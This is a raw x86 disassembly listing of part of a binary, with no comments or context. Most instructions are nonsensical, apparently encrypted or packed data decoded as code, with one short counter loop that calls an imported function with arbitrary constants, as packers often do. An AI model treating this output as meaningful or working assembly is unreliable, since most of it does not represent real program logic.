  404923:	into   
  404924:	(bad)  
  404925:	xchg   ebp,eax
  404926:	outs   dx,BYTE PTR ds:[esi]
  404927:	(bad)  
  404928:	adc    al,0xf7
  40492a:	mov    WORD PTR [ecx+0x78],fs
  40492d:	outs   dx,DWORD PTR ds:[esi]
  40492e:	jno    0x404932
  404930:	adc    ecx,DWORD PTR [edi]
  404932:	sub    eax,0xf4e9d106
  404937:	mov    ch,0x13
  404939:	sbb    eax,0x88187a3e
  40493e:	(bad)  
  404940:	retf   
  404941:	pop    esi
  404942:	shl    DWORD PTR [esp+ebp*2+0x48],1
  404946:	popa   
  404947:	cmp    BYTE PTR [ebx],bh
  404949:	std    
  40494a:	push   esp
  40494b:	dec    edx
  40494c:	inc    esp
  40494d:	push   ss
  40494e:	pop    esp
  40494f:	call   0xa57c:0x164610f2
  404956:	inc    esi
  404957:	push   ss
  404958:	lea    edi,[esi+ebp*4+0x2cd3298]
  40495f:	sub    DWORD PTR [eax],edx
  404961:	in     eax,0xa1
  404963:	stos   BYTE PTR es:[edi],al
  404964:	cmp    edx,DWORD PTR [edx]
  404966:	in     eax,0x32
  404968:	and    DWORD PTR [eax-0x118434cd],ebp
  40496e:	xchg   edi,eax
  40496f:	jg     0x404966
  404971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404972:	stos   BYTE PTR es:[edi],al
  404973:	gs ins BYTE PTR es:[edi],dx
  404975:	add    al,0xea
  404977:	push   ds
  404978:	adc    BYTE PTR [edi-0x7d],ch
  40497b:	add    DWORD PTR [eax-0x51f677e4],edx
  404981:	add    ch,BYTE PTR [eax]
  404983:	ja     0x404916
  404985:	sbb    DWORD PTR [edx-0x1d],ebx
  404988:	daa    
  404989:	pop    eax
  40498a:	call   0xe414a13e
  40498f:	cwde   
  404990:	aam    0x20
  404992:	mov    esi,DWORD PTR [edi]
  404994:	jnp    0x40493e
  404996:	mov    eax,0xddbfb3d4
  40499b:	ins    DWORD PTR es:[edi],dx
  40499c:	or     al,0xe1
  40499e:	test   al,0x48
  4049a0:	and    DWORD PTR [ebp-0x23],ebp
  4049a3:	call   0xeb41:0x10da99c0
  4049aa:	inc    ebp
  4049ab:	ja     0x4049bd
  4049ad:	nop
  4049ae:	jae    0x4049d8
  4049b0:	mov    al,0x5f
  4049b2:	jp     0x404952
  4049b4:	fild   DWORD PTR [ecx+eax*4+0x6e]
  4049b8:	jle    0x4049ed
  4049ba:	lds    esp,FWORD PTR [edx-0x4f71a67a]
  4049c0:	cmp    esp,eax
  4049c2:	in     al,dx
  4049c3:	neg    BYTE PTR [esi+0x52]
  4049c6:	mov    ds:0x7a209273,al
  4049cb:	jnp    0x4049c0
  4049cd:	dec    eax
  4049ce:	je     0x4049c1
  4049d0:	in     eax,0x86
  4049d2:	das    
  4049d3:	pop    edx
  4049d4:	sahf   
  4049d5:	jmp    0x828b:0xef659442
  4049dc:	jbe    0x4049d1
  4049de:	fdivr  DWORD PTR [esi]
  4049e0:	cli    
  4049e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e2:	mov    ebx,0x2fd692f9
  4049e7:	mov    al,0xc7
  4049e9:	dec    ebx
  4049ea:	out    0xa8,al
  4049ec:	test   al,bh
  4049ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ef:	pop    edx
  4049f0:	lock sbb al,BYTE PTR [eiz*2+0x443d0b6e]
  4049f8:	call   0xbfbd:0x5b61001c
  4049ff:	pop    edi
  404a00:	lahf   
  404a01:	push   cs
  404a02:	rol    DWORD PTR [ebx-0x7c3ce1f9],0x5c
  404a09:	mov    BYTE PTR [ebx-0x3b],dl
  404a0c:	nop
  404a0d:	cs int3 
  404a0f:	xor    DWORD PTR ds:0x8b606f92,edi
  404a15:	xor    BYTE PTR [esi-0x2159c2d6],0xef
  404a1c:	add    eax,0xc7a88322
  404a21:	int3   
  404a22:	cmp    al,0x47
  404a24:	or     al,0x6f
  404a26:	js     0x404a5e
  404a28:	add    dh,dl
  404a2a:	sbb    DWORD PTR [ebx+ebx*8+0x290d9c5],edi
  404a31:	mov    eax,?
  404a33:	add    al,0xa1
  404a35:	mov    ecx,ebx
  404a37:	in     eax,dx
  404a38:	dec    edx
  404a39:	fidivr WORD PTR [ebx]
  404a3b:	enter  0xa11f,0xa4
  404a3f:	push   esi
  404a40:	adc    eax,0x3a5aeb49
  404a45:	pop    ecx
  404a46:	iret   
  404a47:	cmp    eax,0xcd4917da
  404a4c:	js     0x404a07
  404a4e:	push   eax
  404a4f:	or     BYTE PTR [ecx+0x7],dl
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	mov    esi,0x46f9b564
  404ae7:	cs js  0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404acb
  404aef:	scas   al,BYTE PTR es:[edi]
  404af0:	das    
  404af1:	jle    0x404b41
  404af3:	loop   0x404b5d
  404af5:	cmp    BYTE PTR [ebx+0x1d8823cd],al
  404afb:	mov    edi,0x3ab6f011
  404b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b01:	mov    ds:0x68eceab5,al
  404b06:	aaa    
  404b07:	dec    eax
  404b08:	xor    ebp,ecx
  404b0a:	gs xchg edx,eax
  404b0c:	aam    0x44
  404b0e:	jmp    0xe31f711a
  404b13:	mov    al,ds:0xe0904445
  404b18:	sbb    ch,cl
  404b1a:	mov    dl,0x68
  404b1c:	adc    BYTE PTR [eax],dh
  404b1e:	stos   BYTE PTR es:[edi],al
  404b1f:	sti    
  404b20:	inc    esp
  404b21:	mov    eax,ds:0x5dfc0a2c
  404b26:	jbe    0x404b15
  404b28:	pop    edx
  404b29:	in     al,dx
  404b2a:	add    edi,DWORD PTR [edx]
  404b2c:	push   esp
  404b2d:	ret    0xd136
  404b30:	int    0x92
  404b32:	mov    dl,0xe
  404b34:	(bad)  
  404b36:	or     BYTE PTR [edx+ecx*2+0x423f97e5],0xb5
  404b3e:	dec    ecx
  404b3f:	inc    edi
  404b40:	mov    ecx,0x1846b2bf
  404b45:	hlt    
  404b46:	xor    BYTE PTR [eax],ah
  404b48:	sub    BYTE PTR [ebp+0x5a],dh
  404b4b:	sbb    eax,0xd4af4d47
  404b50:	sbb    ebx,DWORD PTR [edx+0x28d86e09]
  404b56:	mov    dh,0x4
  404b58:	mov    ah,0x90
  404b5a:	mov    eax,ecx
  404b5c:	add    BYTE PTR [esi-0x30],al
  404b5f:	ins    BYTE PTR es:[edi],dx
  404b60:	jbe    0x404b71
  404b62:	pop    esp
  404b63:	imul   esi,edx,0x433906f9
  404b69:	fs (bad) 
  404b6b:	and    WORD PTR [esp+esi*1-0x66],sp
  404b70:	and    al,BYTE PTR [edi]
  404b72:	ins    DWORD PTR es:[edi],dx
  404b73:	(bad)  
  404b74:	adc    eax,DWORD PTR [ecx]
  404b76:	or     eax,0x13620c1b
  404b7b:	ret    0xe31b
  404b7e:	cmp    BYTE PTR [edi],dh
  404b80:	into   
  404b81:	ins    DWORD PTR es:[edi],dx
  404b82:	and    bh,bl
  404b84:	xchg   ebp,eax
  404b85:	(bad)  
  404b86:	hlt    
  404b87:	inc    eax
  404b88:	add    esi,edx
  404b8a:	aam    0x3d
  404b8c:	or     BYTE PTR [edx+0x41],cl
  404b8f:	into   
  404b90:	xchg   DWORD PTR [eax+0x5cc90388],esp
  404b96:	mov    edi,0x4d46e211
  404b9b:	out    dx,eax
  404b9c:	or     al,0x2a
  404b9e:	pop    edx
  404b9f:	mov    al,0x91
  404ba1:	sbb    esp,DWORD PTR [edi]
  404ba3:	and    DWORD PTR [eax-0x4c],0x80e69450
  404baa:	stos   BYTE PTR es:[edi],al
  404bab:	addr16 mov ebp,0x6519671
  404bb1:	xor    BYTE PTR [ebp-0x34],0xb4
  404bb5:	mov    ax,0xd227
  404bb9:	(bad)  
  404bba:	and    BYTE PTR [ebx],dl
  404bbc:	inc    eax
  404bbd:	jo     0x404b44
  404bbf:	xchg   DWORD PTR [ecx-0x6c42f8fb],eax
  404bc5:	aam    0x88
  404bc7:	mov    dl,0xba
  404bc9:	loopne 0x404c1c
  404bcb:	mov    dh,0x4d
  404bcd:	xlat   BYTE PTR ds:[ebx]
  404bce:	push   es
  404bcf:	jo     0x404c40
  404bd1:	rcpps  xmm1,XMMWORD PTR [ecx+ecx*2+0x10]
  404bd6:	(bad)  
  404bd7:	les    edi,FWORD PTR [edx+ecx*2]
  404bda:	jle    0x404bfe
  404bdc:	xor    dl,dl
  404bde:	(bad)  [eax]
  404be0:	in     al,dx
  404be1:	push   0xffffffc1
  404be3:	jo     0x404c52
  404be5:	and    al,0xd0
  404be7:	sbb    dl,BYTE PTR [esi+0x4a0b3ada]
  404bed:	jmp    0x404b6f
  404bef:	jmp    0x404c43
  404bf1:	into   
  404bf2:	xor    DWORD PTR [esi+0x6136b31a],ebx
  404bf8:	adc    ebx,esi
  404bfa:	nop
  404bfb:	cmp    cl,cl
  404bfd:	std    
  404bfe:	aaa    
  404bff:	xor    DWORD PTR [edi-0x6e],edx
  404c02:	fisub  DWORD PTR ds:0x7ddc254f
  404c08:	ins    BYTE PTR es:[edi],dx
  404c09:	es inc edi
  404c0b:	mov    ecx,0x3a0eac0f
  404c10:	and    DWORD PTR [ecx-0x7e],0x62
  404c14:	stos   BYTE PTR es:[edi],al
  404c15:	test   al,0xa6
  404c17:	enter  0xd664,0xf9
  404c1b:	mov    esi,0x1e931a76
  404c20:	xlat   BYTE PTR ds:[ebx]
  404c21:	adc    eax,0xef00fbb7
  404c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c27:	ret    0x2945
  404c2a:	stc    
  404c2b:	pop    esi
  404c2c:	mov    al,BYTE PTR [esi]
  404c2e:	cmp    ebx,ecx
  404c30:	popf   
  404c31:	or     eax,0x6d57d322
  404c36:	fldcw  WORD PTR [esi]
  404c38:	and    edi,DWORD PTR [eax]
  404c3a:	popf   
  404c3b:	std    
  404c3c:	push   ebx
  404c3d:	add    eax,0x75862ad2
  404c42:	jne    0x404c81
  404c44:	pop    ss
  404c45:	stos   DWORD PTR es:[edi],eax
  404c46:	cli    
  404c47:	imul   esp,DWORD PTR [edi],0xffffffda
  404c4a:	mov    DWORD PTR [ebx+0x140a42c3],edi
  404c50:	cld    
  404c51:	sub    edi,DWORD PTR [ecx]
  404c53:	or     al,0xeb
  404c55:	adc    eax,0xee15f083
  404c5a:	cmp    esi,DWORD PTR [eax-0x16]
  404c5d:	in     eax,dx
  404c5e:	push   esi
  404c5f:	daa    
  404c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c61:	or     eax,edx
  404c63:	jge    0x404c62
  404c65:	and    eax,0xcdbc1388
  404c6a:	leave  
  404c6b:	and    bh,BYTE PTR [edx-0x6157f82]
  404c71:	sbb    edx,DWORD PTR [edx]
  404c73:	es sbb eax,0x14376a5d
  404c79:	pusha  
  404c7a:	and    BYTE PTR [ebx],cl
  404c7c:	and    ah,BYTE PTR [edx]
  404c7e:	sub    al,0xd2
  404c80:	jae    0x404ca7
  404c82:	xor    bh,al
  404c84:	inc    eax
  404c85:	imul   ebx,DWORD PTR ds:0x5ae1,0x14e391cd
  404c8e:	pop    esp
  404c8f:	cmp    edi,esi
  404c91:	leave  
  404c92:	xchg   edi,eax
  404c93:	fdiv   QWORD PTR [edi-0x50770782]
  404c99:	lea    edi,[eax]
  404c9b:	pusha  
  404c9c:	dec    ebx
  404c9d:	and    DWORD PTR [edi],ebp
  404c9f:	fnstenv [edx-0x4a]
  404ca2:	aam    0xbc
  404ca4:	out    0xdf,al
  404ca6:	and    ah,cl
  404ca8:	daa    
  404ca9:	push   ebx
  404caa:	mov    bl,0xe0
  404cac:	retf   
  404cad:	ret    0x669a
  404cb0:	gs jp  0x404c39
  404cb3:	cmp    al,BYTE PTR [ecx]
  404cb5:	sbb    DWORD PTR [esi-0x3b],esi
  404cb8:	retf   0x1321
  404cbb:	adc    BYTE PTR [edx],bl
  404cbd:	bound  edi,QWORD PTR [eax-0x532dac1]
  404cc3:	push   ds
  404cc4:	xor    BYTE PTR [edx+0x27],0xd6
  404cc8:	adc    eax,edx
  404cca:	lods   al,BYTE PTR ds:[esi]
  404ccb:	adc    esi,DWORD PTR [ecx+0x8]
  404cce:	retf   0xa1e8
  404cd1:	(bad)  
  404cd3:	call   0xf3b3:0x2b73f6a5
  404cda:	sbb    DWORD PTR [ecx-0xc],0xe145279b
  404ce1:	inc    ebx
  404ce2:	in     al,dx
  404ce3:	or     ch,dl
  404ce5:	retf   0xdb7f
  404ce8:	fnstcw WORD PTR [edx-0x22a9400d]
  404cee:	add    DWORD PTR [eax+0x1021c519],esi
  404cf4:	mov    ah,0x36
  404cf6:	dec    ecx
  404cf7:	aam    0x19
  404cf9:	sar    DWORD PTR [ebx],0xb
  404cfc:	add    al,0x37
  404cfe:	inc    edi
  404cff:	stc    
  404d00:	shl    DWORD PTR [esi],0xb
  404d03:	push   ebp
  404d04:	mov    cl,BYTE PTR [eax]
  404d06:	fs jge 0x404d50
  404d09:	repnz pop edx
  404d0b:	fist   DWORD PTR [ebx-0x3d8476ec]
  404d11:	scas   al,BYTE PTR es:[edi]
  404d12:	jnp    0x404cd9
  404d14:	ret    
  404d15:	mov    ah,0x8f
  404d17:	push   cs
  404d18:	mov    ds:0xce438506,eax
  404d1d:	xor    cx,WORD PTR [edx]
  404d20:	dec    eax
  404d21:	push   0xa77d5a26
  404d26:	xor    eax,0xacb87714
  404d2b:	xor    BYTE PTR [ebx+0x12],bh
  404d2e:	aas    
  404d2f:	ds sub bl,al
  404d32:	jp     0x404d2f
  404d34:	xchg   BYTE PTR [ebx-0x6555babb],ah
  404d3a:	loop   0x404d20
  404d3c:	and    dh,cl
  404d3e:	test   DWORD PTR [ebp+0x5d],ebx
  404d41:	(bad)  
  404d42:	ret    0x4299
  404d45:	pop    es
  404d46:	and    esp,ebx
  404d48:	xchg   edx,eax
  404d49:	call   0xe979:0xc210ce4b
  404d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d51:	(bad)  
  404d52:	sbb    eax,0x6385bd94
  404d57:	out    dx,eax
  404d58:	sub    esp,DWORD PTR [eax+0x7214ac90]
  404d5e:	inc    ebp
  404d5f:	in     al,0xe4
  404d61:	adc    dl,BYTE PTR [esi+0x287860f1]
  404d67:	xchg   esp,eax
  404d68:	lea    esp,[esi+0x701a391b]
  404d6e:	jmp    0x404dae
  404d70:	cmp    ah,BYTE PTR [eax-0x73]
  404d73:	sbb    esp,ebx
  404d75:	xor    ecx,DWORD PTR [edi-0x2e]
  404d78:	popf   
  404d79:	jecxz  0x404d0d
  404d7b:	dec    ecx
  404d7c:	cmp    DWORD PTR [ebx+0x30],0x5dd060af
  404d83:	mov    dh,0x35
  404d85:	and    al,BYTE PTR ds:0x57e3ac72
  404d8b:	xor    eax,0xab606e8a
  404d90:	and    esi,DWORD PTR [ebx+0x78]
  404d93:	cld    
  404d94:	sbb    DWORD PTR [esi],esp
  404d96:	das    
  404d97:	bound  edi,QWORD PTR [edi-0x4896909c]
  404d9d:	xchg   edi,eax
  404d9e:	(bad)  
  404d9f:	fmul   QWORD PTR [ecx]
  404da1:	(bad)  
  404da3:	mov    cs,edx
  404da5:	pushf  
  404da6:	mov    ds:0x78667aff,eax
  404dab:	js     0x404d97
  404dad:	retf   0xee48
  404db0:	aas    
  404db1:	xor    al,0x88
  404db3:	adc    ecx,DWORD PTR [ebx+ecx*8+0x2d]
  404db7:	inc    edi
  404db8:	jne    0x404e35
  404dba:	mov    cl,0xb2
  404dbc:	xor    ecx,DWORD PTR [esi+eax*8-0x74a88cec]
  404dc3:	jge    0x404dd5
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	cmc    
  404de9:	pop    ecx
  404dea:	cmp    ebp,DWORD PTR [edx+0x7878339b]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404df0
  404df5:	mov    bl,0x9d
  404df7:	daa    
  404df8:	sub    DWORD PTR [eax-0x1b],ecx
  404dfb:	data16 mov ds:0xbfc77f70,al
  404e01:	ja     0x404e30
  404e03:	or     ch,ah
  404e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e06:	xor    edi,ebx
  404e08:	or     DWORD PTR [edx-0x22],0x74
  404e0c:	or     ch,dh
  404e0e:	mov    esi,0x7e92f614
  404e13:	adc    BYTE PTR [edi],cl
  404e15:	or     al,0x6c
  404e17:	push   es
  404e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e19:	xchg   edi,eax
  404e1a:	not    BYTE PTR [eax+0x44]
  404e1d:	lahf   
  404e1e:	sub    DWORD PTR [esi+edi*2],eax
  404e21:	inc    esi
  404e22:	jbe    0x404e21
  404e24:	push   edx
  404e25:	gs fs mov esp,0x3c0326f4
  404e2c:	out    0xc1,al
  404e2e:	sbb    eax,0x10c86fee
  404e33:	push   ecx
  404e34:	add    cl,BYTE PTR [eax]
  404e36:	jge    0x404dfa
  404e38:	imul   ecx,DWORD PTR [edi],0xffffffd1
  404e3b:	(bad)  [edx-0x19]
  404e3e:	mov    dl,0xd7
  404e40:	lods   eax,DWORD PTR ds:[esi]
  404e41:	hlt    
  404e42:	repnz lahf 
  404e44:	test   DWORD PTR [ebx+0x67c8dac5],0xc40618dd
  404e4e:	and    cl,BYTE PTR [edi]
  404e50:	mov    ebx,0xcd76bd8a
  404e55:	jl     0x404e09
  404e57:	jo     0x404ed5
  404e59:	xchg   esp,eax
  404e5a:	mov    dh,0xcf
  404e5c:	dec    DWORD PTR [eax+0x2d09634b]
  404e62:	or     eax,0x66e165da
  404e67:	iret   
  404e68:	ficomp DWORD PTR [ecx+edx*1-0xf]
  404e6c:	inc    esi
  404e6d:	fstp   DWORD PTR [edi]
  404e6f:	xchg   ebp,eax
  404e70:	xchg   BYTE PTR [esi-0x60454b25],bh
  404e76:	mov    al,0x69
  404e78:	mov    eax,0x58cc20f9
  404e7d:	adc    BYTE PTR [ecx],ah
  404e7f:	int    0x97
  404e81:	jmp    0x404e53
  404e83:	cmp    al,0x70
  404e85:	pop    ebx
  404e86:	ror    dl,1
  404e88:	or     DWORD PTR [edx],0xba22355c
  404e8e:	adc    BYTE PTR [ebx-0x120c687e],ah
  404e94:	sub    ch,BYTE PTR [ebx-0x5f]
  404e97:	push   edx
  404e98:	push   edi
  404e99:	clc    
  404e9a:	jmp    0x404e24
  404e9c:	retf   
  404e9d:	bound  esp,QWORD PTR [edi+0x31]
  404ea0:	pop    ebx
  404ea1:	scas   al,BYTE PTR es:[edi]
  404ea2:	jecxz  0x404eef
  404ea4:	fnsetpm(287 only) 
  404ea6:	mov    ebx,0x705292b8
  404eab:	mov    ah,bl
  404ead:	inc    ecx
  404eae:	nop
  404eaf:	scas   al,BYTE PTR es:[edi]
  404eb0:	loopne 0x404eea
  404eb2:	outs   dx,BYTE PTR ds:[esi]
  404eb3:	sbb    esp,DWORD PTR [eax-0x21]
  404eb6:	lea    ebp,[ecx-0x4f0fdea6]
  404ebc:	jb     0x404e7d
  404ebe:	test   DWORD PTR [ecx+0x1d],ebp
  404ec1:	add    eax,0x7e856fe3
  404ec6:	daa    
  404ec7:	adc    edx,eax
  404ec9:	loopne 0x404e5e
  404ecb:	push   cs
  404ecc:	shl    DWORD PTR [eax+0x7b],0x8f
  404ed0:	or     cl,BYTE PTR [ebp+0x3b]
  404ed3:	loop   0x404ea5
  404ed5:	mov    ebp,0x56b78f27
  404eda:	in     al,0x9d
  404edc:	les    esp,FWORD PTR [ebp+eiz*4-0x41]
  404ee0:	jno    0x404e99
  404ee2:	ret    0x1d8a
  404ee5:	fild   DWORD PTR [ebx]
  404ee7:	imul   eax,ebx,0x8669b421
  404eed:	xchg   ecx,eax
  404eee:	jmp    0x404e70
  404ef0:	adc    al,0x31
  404ef2:	out    dx,al
  404ef3:	jbe    0x404e75
  404ef5:	and    dl,BYTE PTR [ebp-0x68]
  404ef8:	dec    ecx
  404ef9:	imul   edi,DWORD PTR [edi+0x69],0x1bcbccd8
  404f00:	or     eax,0xa8f4a22f
  404f05:	push   edx
  404f06:	jns    0x404eaf
  404f08:	push   es
  404f09:	adc    al,0x78
  404f0b:	dec    eax
  404f0c:	imul   eax,DWORD PTR [ecx],0xb2340be
  404f12:	sub    ebp,DWORD PTR [esi+0x2cb3ee7f]
  404f18:	sub    eax,0x43381005
  404f1d:	outs   dx,DWORD PTR ds:[esi]
  404f1e:	jmp    FWORD PTR [esi-0x63fd342f]
  404f24:	jg     0x404f84
  404f26:	cmc    
  404f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f28:	(bad)  
  404f29:	fwait
  404f2a:	je     0x404f50
  404f2c:	xor    BYTE PTR [ecx+esi*4],ch
  404f2f:	jns    0x404ee3
  404f31:	xchg   ecx,eax
  404f32:	and    esp,DWORD PTR [edi+esi*2]
  404f35:	cmp    ch,ah
  404f37:	push   cs
  404f38:	mov    ch,0x32
  404f3a:	es push eax
  404f3c:	in     eax,0x54
  404f3e:	adc    bh,BYTE PTR [ebp+0x3be6adc2]
  404f44:	mov    ds:0xb7d3b4c3,al
  404f49:	mov    ds:0xcd74cc56,eax
  404f4e:	ja     0x404ee3
  404f50:	pop    ebp
  404f51:	add    eax,0xfa0589fd
  404f56:	call   0x919eae0b
  404f5b:	pop    ds
  404f5c:	sbb    esp,ebx
  404f5e:	hlt    
  404f5f:	cmp    DWORD PTR [ebp+0x31c6cb3f],edi
  404f65:	pop    ebp
  404f66:	stos   BYTE PTR es:[edi],al
  404f67:	and    dh,BYTE PTR [ecx]
  404f69:	sbb    ecx,DWORD PTR [ecx]
  404f6b:	lods   eax,DWORD PTR ds:[esi]
  404f6c:	adc    eax,0x49c51b40
  404f71:	mov    ebp,0x99c61087
  404f76:	dec    edi
  404f77:	add    al,0x87
  404f79:	js     0x404f41
  404f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f7c:	(bad)  
  404f7d:	adc    eax,0xdd624507
  404f82:	or     eax,0x62b22594
  404f87:	(bad)
  404f8a:	cmp    DWORD PTR [ebx+edx*8-0x36],edi
  404f8e:	cmp    ebp,DWORD PTR [ecx-0x15]
  404f91:	and    DWORD PTR [ecx],ebp
  404f93:	push   cs
  404f94:	gs push ds
  404f96:	mov    ch,0x26
  404f98:	aad    0xdf
  404f9a:	push   edi
  404f9b:	xor    BYTE PTR ds:0xd3736bfc,dh
  404fa1:	pop    edx
  404fa2:	inc    edi
  404fa3:	mov    esp,0xc558dedc
  404fa8:	lock sub al,0xbb
  404fab:	push   esp
  404fac:	sub    esp,ebp
  404fae:	fldenv [ecx+0x2b]
  404fb1:	and    ch,ch
  404fb3:	adc    DWORD PTR [edx+ebx*2-0x77],edx
  404fb7:	in     al,0xa6
  404fb9:	fisttp WORD PTR [edx-0x70b29ce0]
  404fbf:	pop    ds
  404fc0:	pusha  
  404fc1:	push   ecx
  404fc2:	fist   WORD PTR [ebx+0x62eb894b]
  404fc8:	gs pop es
  404fca:	ret    0x4212
  404fcd:	sahf   
  404fce:	loopne 0x404f56
  404fd0:	loopne 0x404faf
  404fd2:	test   BYTE PTR [bx+0x6b],ah
  404fd6:	or     eax,0xbc36c729
  404fdb:	mov    ch,0x3a
  404fdd:	xchg   DWORD PTR [edx],eax
  404fdf:	xor    ebx,DWORD PTR [ecx]
  404fe1:	mov    al,0x44
  404fe3:	clc    
  404fe4:	cmp    al,0xdd
  404fe6:	clc    
  404fe7:	push   ebp
  404fe8:	add    ebp,0x7ad0cf89
  404fee:	test   eax,0x3de04c46
  404ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ff4:	loopne 0x404ffc
  404ff6:	xchg   ebx,eax
  404ff7:	mov    WORD PTR [eax-0x544d0099],es
  404ffd:	mov    ch,0x19
  404fff:	enter  0x1007,0xc3
  405003:	cli    
  405004:	pop    ebp
  405005:	and    al,0x72
  405007:	add    BYTE PTR [edi+edx*1-0xdbed8a1],dl
  40500e:	fstp   st(0)
  405010:	repz pop ebx
  405012:	shr    BYTE PTR [eax+0x13],cl
  405015:	js     0x40505d
  405017:	fild   QWORD PTR [ecx-0x56]
  40501a:	sti    
  40501b:	or     dh,BYTE PTR [ecx+0x59]
  40501e:	cmp    BYTE PTR [edi-0x28dcb589],cl
  405024:	add    al,0x69
  405026:	inc    ecx
  405027:	rcl    BYTE PTR [ebx],cl
  405029:	test   BYTE PTR [esi-0x7ad9b2a6],ah
  40502f:	call   0xe105b170
  405034:	outs   dx,BYTE PTR ds:[esi]
  405035:	adc    esi,esi
  405037:	enter  0x312c,0xf6
  40503b:	adc    al,0xb5
  40503d:	dec    edx
  40503e:	mov    edi,0x6d96c413
  405043:	(bad)  
  405044:	pop    edx
  405045:	xor    al,0xe3
  405047:	leave  
  405048:	clc    
  405049:	(bad)  
  40504b:	jecxz  0x405021
  40504d:	pusha  
  40504e:	frstor ss:[ebx]
  405051:	stos   DWORD PTR es:[edi],eax
  405052:	sbb    esp,DWORD PTR [ebx-0x25]
  405055:	out    0xfb,al
  405057:	jbe    0x405063
  405059:	mov    ds:0xdc220b5b,al
  40505e:	ret    
  40505f:	sbb    edx,esi
  405061:	pop    eax
  405062:	jmp    0xfdbd7d89
  405067:	lds    esp,FWORD PTR [ebp-0x3c]
  40506a:	xor    cl,BYTE PTR [edi]
  40506c:	icebp  
  40506d:	scas   al,BYTE PTR es:[edi]
  40506e:	push   edi
  40506f:	xor    bl,dl
  405071:	test   DWORD PTR [edx+0x11],edx
  405074:	sub    al,0x74
  405076:	sar    BYTE PTR [ebx+0xc],cl
  405079:	fistp  QWORD PTR [esi+0x523a39ec]
  40507f:	and    BYTE PTR [ebx],dl
  405081:	jecxz  0x40505c
  405083:	sbb    eax,0x93d5b53
  405088:	(bad)  
  405089:	push   esi
  40508a:	jmp    0x559d3908
  40508f:	pop    DWORD PTR [edx]
  405091:	gs jecxz 0x4050cf
  405094:	ins    BYTE PTR es:[edi],dx
  405095:	pop    eax
  405096:	add    DWORD PTR [ebp+0x6faecdd9],eax
  40509c:	out    dx,al
  40509d:	daa    
  40509e:	adc    dh,dh
  4050a0:	push   0x5f85db93
  4050a5:	mov    ebx,0xcbc6b362
  4050aa:	bound  ebp,QWORD PTR [edx+0x56b100e1]
  4050b0:	ins    DWORD PTR es:[edi],dx
  4050b1:	jb     0x405089
  4050b3:	xchg   al,cl
  4050b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050b6:	repnz sub BYTE PTR [edi+0x11],dl
  4050ba:	cmp    DWORD PTR [edi],eax
  4050bc:	sub    dl,al
  4050be:	aad    0x25
  4050c0:	in     eax,dx
  4050c1:	add    eax,0x32657c0b
  4050c6:	cmp    DWORD PTR [edi-0x327298],0x7d03f82b
  4050d0:	adc    BYTE PTR [ebx],dh
  4050d2:	rol    DWORD PTR [ebx],1
  4050d4:	(bad)  
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x42b2102],bh
  4050fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x405131
  405106:	popa   
  405107:	test   DWORD PTR [esi-0x53bb484a],ebx
  40510d:	mov    ah,0xa8
  40510f:	inc    eax
  405110:	sbb    al,0xab
  405112:	out    dx,eax
  405113:	xor    eax,0xac21e41f
  405118:	js     0x4050e2
  40511a:	inc    edi
  40511b:	mov    esp,0x7a24870
  405120:	fcom   QWORD PTR gs:[ebp+0x6b99efd5]
  405127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405128:	cli    
  405129:	stc    
  40512a:	test   DWORD PTR ds:0xa3ec9eb3,ecx
  405130:	test   esi,0x29a8201e
  405136:	out    dx,al
